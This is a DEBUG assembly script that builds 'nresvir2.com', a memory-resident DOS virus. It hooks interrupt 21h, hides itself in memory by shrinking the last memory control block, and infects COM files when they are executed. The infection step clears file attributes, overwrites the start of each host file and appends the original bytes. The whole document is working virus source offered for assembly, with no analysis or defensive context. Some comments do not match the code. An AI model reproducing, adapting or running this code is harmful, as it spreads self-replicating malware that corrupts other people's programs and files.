nresvir2.com
a100
;
mov ah,ff
int 21          
cmp ax,dead             ;checking if already resident.
jnz 10d                 ;if not resident jmp 10d
mov ah,fe       
int 21                  ;else run orig prog.
;*****10d******
mov ah,52               ;get first MCB
int 21
es:mov ax,[bx-2]
;*****115******         ;search loop for last MCB
mov ds,ax
add ax,[3]
inc ax
cmp by [0],5a           ;check if last MCB
jnz 115                 ;if not continue search
mov bx,2c               ;2ch paragraphs = 704 bytes.
sub [3],bx              ;allocate memory        
sub ax,bx               ;calc segment of allocated mem
sub ax,10               ;so alligned to cs:100
mov es,ax               ;ES is reserved segment.              
mov si,100              ;from ds:100
mov di,si               ;to es:100
mov cx,155              ;move 153 bytes
push cs
pop ds                  ;DS = CS
repz movsb              ;move bytes.
push es
pop ds
mov ax,3521
int 21
mov [175],bx             ;equ cs:172
mov [177],es             ;equ cs:174
mov dx,158              ;equ cs:155
mov ax,2521
int 21
mov ah,fe
int 21
;****158****
pushf
cmp ah,4b
jnz 161
call 179                ;call infector
cmp ah,ff               ;*****161
jnz 16b
mov ax,dead
popf
iret
cmp ah,fe               ;*****16b
jnz 173
jmp 22b
popf                    ;*****173
;*****174
jmp 0:0                 
;*****179               *****infector
push ds                 ;save regs
push es
db 60                  
cs:          ;;;;;;;;;;;
mov [249],ds
push cs
pop ds
mov [247],dx
mov ax,3524
mov [24d],es
mov [24b],bx
mov dx,244               ;equ cs:242
mov ax,2524
int 21
lds dx,[247]
mov ax,3d02
int 21
jc 209
mov bx,ax
cs:
mov [251],ax
mov ax,4300
int 21
cs:
mov [24f],cx
xor cx,cx
mov ax,4301
int 21
mov cx,155
push cs
pop ds
mov dx,255
mov ah,3f
int 21
mov cx,10
push cs
pop es
mov si,100
mov di,255
repz
cmpsb
jz 209                  ;file already infected.
cmp wo [255],5a4d
jz 209                  ;EXE file;
xor cx,cx
xor dx,dx
mov ax,4202
int 21
cs:
mov [253],ax
mov dx,255
mov cx,155
mov ah,40
int 21
xor cx,cx
xor dx,dx
mov ax,4200
int 21
mov ah,40
mov dx,100
mov cx,155
int 21
mov ah,3e               ;*****206
sti
int 21
cs:lds dx,[247]
mov ax,4301
cs:mov cx,[24f]
int 21
cs:
lds dx,[24b]
mov ax,2524
int 21
db 61
pop es
pop ds
ret
pop ax                  ;*****228                        
pop ax
pop ax
mov ds,ax
mov es,ax
mov si,[253]
mov di,100
add si,di
nop
push ds
push di
mov cx,155
repz movsb
iret
mov al,0                ;*****244                      
iret                
;247 ds:dx of file
dw 0                    
dw 0                    
;24b int 24 vector
dw 0
dw 0
;24f attribs
dw 0
;241 handle
dw 0
;253 length
dw 0

rcx
155
w
q
